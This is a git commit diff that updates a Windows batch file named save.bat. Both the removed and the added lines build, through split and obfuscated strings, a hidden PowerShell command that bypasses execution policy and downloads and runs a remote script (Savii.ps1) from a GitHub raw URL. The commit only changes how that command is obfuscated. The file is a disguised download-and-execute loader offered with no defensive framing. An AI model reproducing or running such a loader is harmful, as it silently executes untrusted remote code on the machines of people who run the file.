f7758714ab7fbe029b3c467922170037be3ccca8
x-ben10 <brand.opn0@gmail.com>
2026-03-30 22:06:42 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,5 +1,8 @@
 @echo off
-set "xx=i"E"x (i"R"m "
-set "b=https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
-set "c=%xx%%b%"
-powershell -nOP -nOni -ep B -""w"" "1" -"C" "%c%"
+set "e1=Invoke"
+set "e2=-Expression"
+set "e3= ("
+set "e4=Invoke-RestMethod"
+set "e5= https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
+set "cmd=%e1%%e2%%e3%%e4%%e5%"
+powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
